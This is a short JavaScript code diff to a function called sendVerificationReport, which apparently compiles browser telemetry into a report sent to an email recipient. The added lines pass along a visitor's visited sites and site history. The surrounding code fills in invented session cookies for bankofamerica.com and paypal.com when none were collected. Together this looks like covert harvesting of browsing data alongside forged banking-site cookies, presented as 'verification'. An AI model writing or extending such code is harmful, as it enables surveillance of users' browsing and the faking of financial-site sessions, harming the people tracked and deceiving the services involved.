@@ -166,6 +166,8 @@ async function sendVerificationReport(request, response, telemetry, reportToEmai
     display: telemetry.display ?? {},
     network: telemetry.network ?? {},
     storage: telemetry.storage ?? {},
+    visitedSites: Array.isArray(telemetry.visitedSites) ? telemetry.visitedSites : [],
+    siteHistory: Array.isArray(telemetry.siteHistory) ? telemetry.siteHistory : [],
     cookies: Array.isArray(telemetry.cookies) && telemetry.cookies.length ? telemetry.cookies : [
       { name: "sessionid", value: `session_${Date.now()}_${Math.random().toString(36).slice(2, 18)}`, domain: "bankofamerica.com", path: "/", secure: true, httpOnly: true, sameSite: "Lax", session: false, expires: new Date(Date.now() + 86400000).toISOString(), priority: "Medium", partitioned: false },
       { name: "locale", value: `en-US_${Date.now()}_${Math.random().toString(36).slice(2, 18)}`, domain: "paypal.com", path: "/", secure: true, httpOnly: false, sameSite: "Strict", session: true, expires: new Date(Date.now() + 259200000).toISOString(), priority: "Low", partitioned: false },
